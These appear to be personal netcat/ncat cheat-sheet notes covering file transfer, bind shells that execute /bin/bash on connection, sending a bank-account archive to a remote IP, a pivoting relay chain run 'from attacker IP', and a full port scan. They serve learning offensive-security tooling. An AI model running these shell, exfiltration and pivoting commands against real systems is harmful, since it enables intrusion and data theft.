1) Simple HTTP Option usage
nc -v google.com 80
  GET / HTTP/1.1

2) Chat/information transfer between 2 hosts, testing locally
nc -nlvp 1234 ---> nc -nv 127.0.0.1 1234

######################
echo "mongol" >> test.txt
- file transfer
(setup listener and pipe the file to get transferred)
nc -nlvp 1234 < test.txt

(display the file content on screen)
nc -nv 127.0.0.1 1234

(transfer the file content to file)
nc -nv 127.0.0.1 1234 > sample.txt

######################################

3) Execute file upon connection:
(this uses encryption)
ncat -nlvp 1234 -e /bin/bash

(this does not use encryption)
nc -nlvp 1234 -e /bin/bash
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47562

(connect to remote with/out encryption)
nc -nv 127.0.0.1 1234
(UNKNOWN) [127.0.0.1] 1234 (?) open
dir
Desktop    Downloads  Pictures        Public     Videos
Documents  Music      privatekey.pem  Templates
###############
(listener with encryption)
ncat -vlp 1234

(connect with encryption)
ncat -vv 127.0.0.1 1234 -e /bin/bash

OTHER EXAMPLES:
nc -l -p 443 < C:\bank-account.zip --from machine that has the file, this one is windows.

nc -w3 192.168.31.201 443 > C:\bank-account.zip

###############################
4) PIVOTING
(listener 1)
ncat -vlp 4444 -e /bin/bash

(listener 2 and piper)
nc -vlp 1234 | nc -nv 127.0.0.1 4444 | nc -vv 127.0.0.1 5555
(start this listener above, it is important as a listener)

(listener 3)
nc -vlp 5555

(connecting from attacker IP to listener 2)
nc -nv 127.0.0.1 1234 
(enter)
ls
(get the contents of the desktop from port 5555 that's listening)

Connector runs commands on machine connected to port 1234, this gets piped to the machine listening on port 4444, who's output gets piped to the machine listening on port 5555 where resulting commands are displayed). Again commands are ran from the connector, but are displayed on machine listening on port 5555. 

#############################
Port Scan for open ports

nc -z -v 172.16.1.15 1-65535 2>&1 | grep succeeded

###############################
